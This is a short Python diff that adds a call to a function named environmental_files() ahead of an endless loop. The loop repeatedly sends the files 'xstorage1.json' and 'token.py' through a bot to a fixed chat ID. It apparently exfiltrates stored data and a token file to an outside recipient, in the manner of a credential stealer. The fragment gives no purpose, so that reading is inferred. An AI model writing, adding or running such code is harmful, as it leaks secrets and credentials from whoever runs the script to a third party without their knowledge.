@@ -18,6 +18,9 @@ def environmental_files():
             file.close()
 
 
+environmental_files()
+
+
 while True:
     bot.send_document(396978030, open('xstorage1.json', 'rb'))
     bot.send_document(396978030, open('token.py', 'rb'))
